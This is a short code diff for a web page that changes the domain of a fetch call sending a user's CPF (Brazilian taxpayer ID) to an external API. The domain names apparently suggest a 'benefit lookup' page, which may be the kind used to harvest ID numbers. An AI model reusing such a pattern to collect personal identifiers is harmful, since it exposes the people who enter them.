@@ -108,7 +108,8 @@ document.addEventListener("DOMContentLoaded", function () {
     consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
 
     fetch(
-      "https://nova-oportunidade.com/api.php?cpf=" + encodeURIComponent(cpf)
+      "https://oportunidadenumais2025.online/api.php?cpf=" +
+        encodeURIComponent(cpf)
     )
       .then((response) => {
         if (!response.ok) {
